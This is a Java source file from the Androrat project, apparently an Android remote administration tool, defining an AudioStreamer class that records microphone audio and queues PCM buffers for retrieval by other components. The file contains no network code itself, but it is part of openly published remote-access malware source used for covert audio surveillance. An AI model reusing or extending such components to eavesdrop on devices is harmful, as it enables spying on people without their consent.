/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package my.app.Library;

import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.util.Log;

public class AudioStreamer {

	public final String TAG = "AudioStreamer";
	public boolean stop = false;
	
	public BlockingQueue<byte[]> bbq = new LinkedBlockingQueue<byte[]>();
	
	int frequency = 11025;
	int channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_MONO;
	int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
	
	int bufferSizeRecorder;
	//int bufferSizePlayer;
	byte[] buffer;
	byte[] buff; // pour le methode directe
	AudioRecord audioRecord;
	//AudioTrack audioTrack;
	Thread threcord;
	Context ctx;
	int chan ;
	
	public AudioStreamer(OnRecordPositionUpdateListener c, int source, int chan) {
		this.chan = chan ;
		bufferSizeRecorder = AudioRecord.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
		audioRecord = new AudioRecord(source, frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);
		//audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);
		
		audioRecord.setPositionNotificationPeriod(512);
		audioRecord.setRecordPositionUpdateListener(c);
		
		//bufferSizePlayer = AudioTrack.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
		//audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC,frequency, channelConfiguration, audioEncoding, bufferSizePlayer,	AudioTrack.MODE_STREAM);

		threcord = new Thread(
				new Runnable() {
					public void run() {
						record();
					}
				});


	}
	
	public void run() {
		Log.i(TAG, "Launch record thread");
		stop = false;
		threcord.start();
	}
	
	public void record() {
		try {
			if (audioRecord.getState() == AudioRecord.STATE_UNINITIALIZED) {
				Log.e(TAG, "Initialisation failed !");
				audioRecord.release();
				audioRecord = null;
				return;
			}
			
			buffer = new byte[bufferSizeRecorder];
			audioRecord.startRecording();

			while (!stop) {
				int bufferReadResult = audioRecord.read(buffer, 0, bufferSizeRecorder);
				// soit bbq
				byte[] tmp = new byte[bufferReadResult];
				System.arraycopy(buffer, 0, tmp, 0, bufferReadResult);
				bbq.add(tmp);
				// soit direct
				//buff = new byte[bufferReadResult];
				//System.arraycopy(buffer, 0, buff, 0, bufferReadResult);

			}

			audioRecord.stop();

		} catch (Throwable t) {
			Log.e("AudioRecord", "Recording Failed");
		}
		
	}
	
	public byte[] getData() {
		//return buff;
		//ou 
		try {
			if(!bbq.isEmpty()) {
				return bbq.take();
			}
		} catch (InterruptedException e) {
		}
		return null;
	}
	
	public void stop() {
		stop = true;
	}
	
	public int getChannel() {
		return chan;
	}
}
